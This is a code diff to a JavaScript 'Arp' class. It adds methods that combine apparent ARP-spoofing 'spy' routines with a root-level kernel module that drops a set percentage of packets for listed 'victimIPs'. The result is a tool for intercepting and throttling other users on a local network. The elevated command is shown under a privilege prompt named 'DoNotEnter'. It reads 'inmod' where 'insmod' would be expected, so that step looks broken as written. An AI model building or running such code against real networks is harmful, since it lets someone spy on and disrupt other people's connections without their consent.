@@ -1,4 +1,5 @@
 const { spawn } = require("child_process");
+var sudo = require("sudo-prompt");
 
 class Arp {
   privIP;
@@ -72,6 +73,59 @@ class Arp {
     });
     console.log("Process " + proc.pid + "spawned");
     this.processList.push(proc.pid);
+  }
+
+  speedLimitStart(
+    percent,
+    victimIPs,
+    targetIP,
+    targetMAC,
+    gatewayMAC,
+    limited
+  ) {
+    if (limited) {
+      this.spyLimitedStart(targetIP, gatewayMAC);
+    } else {
+      this.spyLimited(targetIP, targetMAC, gatewayMAC);
+    }
+
+    if (process.platform === "linux") {
+      const modulePath = "./kernelModule/netfilter_drop_packet.ko";
+      const cmd =
+        "inmod " +
+        modulePath +
+        " percent=" +
+        percent +
+        " victimIP=" +
+        victimIPs;
+      const options = {
+        name: "DoNotEnter",
+      };
+      console.log("INFO: insert module command is: " + cmd);
+      // insert the kernel module
+      sudo.exec(cmd, options, (error, _stdout, _stderr) => {
+        if (error) {
+          console.log(error);
+        }
+      });
+    }
+  }
+
+  speedLimitStop() {
+    const options = {
+      name: "DoNotEnter",
+    };
+    if (process.platform === "linux") {
+      sudo.exec(
+        "rmmod netfilter_drop_packet",
+        options,
+        (error, _stdout, _stderr) => {
+          if (error) {
+            console.log(error);
+          }
+        }
+      );
+    }
   }
 }
 
